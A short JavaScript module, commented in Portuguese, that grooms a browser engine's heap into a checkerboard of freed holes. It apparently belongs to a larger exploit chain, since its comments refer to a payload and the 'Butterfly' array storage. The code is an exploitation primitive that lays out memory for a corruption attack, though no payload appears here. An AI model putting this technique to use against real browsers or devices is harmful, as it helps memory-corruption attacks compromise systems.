import { log } from './utils.js';

var grooming_stash = [];

export function prepare_checkerboard_heap(size) {
    log(`HEAP: Criando buracos de 0x${size.toString(16)}...`);
    grooming_stash = [];
    
    // Para simular o tamanho de alocação de 0xA0 usando ArrayBuffers:
    // Precisamos levar em conta o overhead do objeto ArrayBuffer.
    // Mas como estamos usando DoubleArray no payload, vamos usar DoubleArray no grooming também
    // para garantir que estamos no mesmo Heap (Butterfly).
    
    let temp = [];
    const elementCount = size / 8;

    for (let i = 0; i < 3000; i++) {
        // Cria arrays do mesmo tipo do payload
        let arr = new Array(elementCount);
        arr.fill(0.0);
        temp.push(arr);
    }
    
    // Libera alternado
    for(let i=0; i<temp.length; i+=2) {
        temp[i] = null;
    }
    
    grooming_stash = temp.filter(x => x !== null);
    log("HEAP: Pronto (Butterfly Mode).", "success");
}

export function clear_heap() {
    grooming_stash = [];
}
